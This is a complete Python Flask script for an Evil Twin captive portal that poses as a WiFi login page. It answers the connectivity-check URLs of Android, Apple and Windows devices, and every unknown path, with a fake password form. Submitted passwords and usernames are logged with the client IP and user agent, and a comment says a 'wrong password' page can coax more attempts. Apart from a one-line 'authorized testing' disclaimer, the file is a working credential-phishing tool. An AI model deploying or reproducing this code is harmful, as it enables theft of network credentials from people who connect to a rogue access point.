#!/usr/bin/env python3
"""
Captive Portal for Evil Twin full credential capture.
Authorized security testing only.
"""

import datetime
import os
import sys
from pathlib import Path

try:
    from flask import Flask, request, redirect, send_from_directory, make_response
except ImportError:
    print("[!] Flask not installed. Run: pip3 install flask")
    sys.exit(1)

SSID = os.environ.get("WIFITOOL_SSID", "Free_WiFi")
LOG_FILE = os.environ.get(
    "WIFITOOL_LOG",
    str(Path(__file__).resolve().parent.parent / "logs" / "captured_passwords.log"),
)
PORTALS = os.environ.get(
    "WIFITOOL_PORTALS",
    str(Path(__file__).resolve().parent.parent / "portals"),
)
HOST = os.environ.get("WIFITOOL_HOST", "0.0.0.0")
PORT = int(os.environ.get("WIFITOOL_PORT", "80"))

Path(LOG_FILE).parent.mkdir(parents=True, exist_ok=True)

app = Flask(__name__, static_folder=PORTALS, static_url_path="/static")


def load_template(name: str) -> str:
    path = Path(PORTALS) / name
    if path.is_file():
        return path.read_text(encoding="utf-8")
    return ""


def render_login() -> str:
    html = load_template("login.html")
    css = load_template("style.css")
    if not html:
        html = """<!DOCTYPE html><html><body>
        <h2>WiFi Login - {{SSID}}</h2>
        <form method="POST" action="/login">
          <input name="password" type="password" placeholder="WiFi Password" required>
          <button type="submit">Connect</button>
        </form></body></html>"""
    html = html.replace("{{SSID}}", SSID)
    html = html.replace("{{CSS}}", css)
    return html


def log_capture(password: str, extra: str = "") -> None:
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "-")
    line = f"[{ts}] IP={ip} SSID={SSID} PASSWORD={password} UA={ua} {extra}\n"
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(line)

    # Print loud to terminal
    print("\n" + "=" * 56, flush=True)
    print("  CAPTURED CREDENTIAL", flush=True)
    print(f"  Time     : {ts}", flush=True)
    print(f"  Client IP: {ip}", flush=True)
    print(f"  SSID     : {SSID}", flush=True)
    print(f"  Password : {password}", flush=True)
    print(f"  UA       : {ua}", flush=True)
    print("=" * 56 + "\n", flush=True)


@app.route("/", methods=["GET"])
@app.route("/index.html", methods=["GET"])
@app.route("/generate_204", methods=["GET"])  # Android captive detect
@app.route("/gen_204", methods=["GET"])
@app.route("/hotspot-detect.html", methods=["GET"])  # Apple
@app.route("/library/test/success.html", methods=["GET"])  # Apple
@app.route("/ncsi.txt", methods=["GET"])  # Windows
@app.route("/connecttest.txt", methods=["GET"])
@app.route("/redirect", methods=["GET"])
@app.route("/canonical.html", methods=["GET"])
@app.route("/success.txt", methods=["GET"])
def captive_entry():
    # Force captive portal page for known probe URLs
    return make_response(render_login(), 200, {"Content-Type": "text/html; charset=utf-8"})


@app.route("/login", methods=["POST"])
@app.route("/log", methods=["POST"])
def login():
    password = (
        request.form.get("password")
        or request.form.get("pass")
        or request.form.get("pwd")
        or request.form.get("wifi_password")
        or ""
    ).strip()
    username = (request.form.get("username") or request.form.get("email") or "").strip()
    extra = f"USER={username}" if username else ""
    if password:
        log_capture(password, extra)

    # show "wrong password" to encourage more attempts, or success page
    success = load_template("success.html")
    if success:
        success = success.replace("{{SSID}}", SSID)
        return success
    return redirect("/?error=1")


@app.route("/style.css")
def css():
    return send_from_directory(PORTALS, "style.css")


@app.errorhandler(404)
def catch_all(e):
    # Any unknown path -> portal (captive portal behavior)
    return make_response(render_login(), 200, {"Content-Type": "text/html; charset=utf-8"})


if __name__ == "__main__":
    print(f"[+] Captive portal listening on {HOST}:{PORT}", flush=True)
    print(f"[+] Logging to {LOG_FILE}", flush=True)
    # host 0.0.0.0 so captive works
    bind = "0.0.0.0"
    app.run(host=bind, port=PORT, debug=False, threaded=True)
